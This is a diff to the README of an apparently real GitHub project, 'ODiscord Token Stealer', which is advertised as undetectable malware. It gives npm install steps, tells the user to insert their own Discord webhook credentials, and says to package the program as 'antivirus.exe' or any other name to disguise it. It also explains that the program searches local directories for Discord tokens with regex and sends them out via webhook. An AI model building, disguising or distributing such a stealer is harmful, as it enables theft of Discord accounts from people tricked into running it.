@@ -1,12 +1,13 @@
+
 # ODiscord Token Stealer
 100% Undetectable Discord token Stealer.
 
-# Installation
+## Installation
 npm:
 
     npm i discord.js && npm i public-ip && npm i os
 
-# Build
+## Build
 
  1. Open index.js and find WebhookID and WebhookToken.
  2. Change it with your Webhook ID and Webhook Token.
@@ -17,6 +18,9 @@ Install  https://www.npmjs.com/package/pkg
 
     pkg index.js -o antivirus.exe(Can be anything)
 For more info of pkg click [me](https://www.npmjs.com/package/pkg).
+
+## How does ODiscord Token Stealer works
+Once the file is runned, the file will check 2 directories where the Discord tokens will be logged and It will use regex to find Discord token/tokens then send it via Discord webhook.
 
 ## License
 <a href="https://github.com/I2rys/ODiscord/blob/main/LICENSE">MIT</a> © <a href="https://github.com/I2rys">I2rys</a>
